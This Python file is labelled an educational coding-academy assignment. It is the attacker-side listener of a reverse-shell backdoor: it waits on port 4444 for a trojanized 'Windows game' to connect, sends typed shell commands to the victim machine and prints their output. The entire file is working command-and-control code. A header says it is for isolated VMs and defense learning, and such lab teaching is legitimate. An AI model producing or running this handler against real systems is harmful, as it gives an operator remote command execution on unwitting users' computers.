"""
**EDUCATIONAL DEMO ONLY – Rwanda Coding Academy Assignment**
Use exclusively in isolated VMs. Never deploy on real systems.
This code demonstrates backdoor techniques for defense learning purposes.
"""

import socket
import subprocess
import threading
import sys

# ============== CONFIGURATION (replace with your Kali VM IP) ==============
LISTEN_IP = "0.0.0.0"   # Listen on all interfaces
LISTEN_PORT = 4444

OUTPUT_END_MARKER = b"\x00\x00\x00"


def handle_client(client_socket, client_addr):
    """
    Handle one reverse shell session. The target (Windows game) has connected.
    We send commands (one line each); target executes them and sends output back
    terminated with OUTPUT_END_MARKER.
    """
    print(f"[+] Session opened from {client_addr[0]}:{client_addr[1]}")
    try:
        while True:
            try:
                cmd = input("\n(shell) $ ").strip()
                if not cmd:
                    continue
                if cmd.lower() in ("exit", "quit"):
                    break
                client_socket.sendall((cmd + "\n").encode())
                output = b""
                client_socket.settimeout(5.0)
                while True:
                    try:
                        chunk = client_socket.recv(4096)
                        if not chunk:
                            break
                        output += chunk
                        if OUTPUT_END_MARKER in output:
                            output = output.replace(OUTPUT_END_MARKER, b"")
                            break
                    except socket.timeout:
                        break
                client_socket.settimeout(None)
                print(output.decode("utf-8", errors="replace"))
            except (EOFError, BrokenPipeError, ConnectionResetError):
                break
    except Exception as e:
        print(f"[-] Session error: {e}")
    finally:
        try:
            client_socket.close()
        except Exception:
            pass
        print(f"[-] Session closed from {client_addr}")


def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((LISTEN_IP, LISTEN_PORT))
    server.listen(5)
    print(f"[*] Listener bound to {LISTEN_IP}:{LISTEN_PORT}")
    print("[*] Waiting for incoming connection from target (run the game on Windows VM)...")

    while True:
        client_socket, client_addr = server.accept()
        # Single session: handle in main thread so we can interact
        handle_client(client_socket, client_addr)


if __name__ == "__main__":
    main()
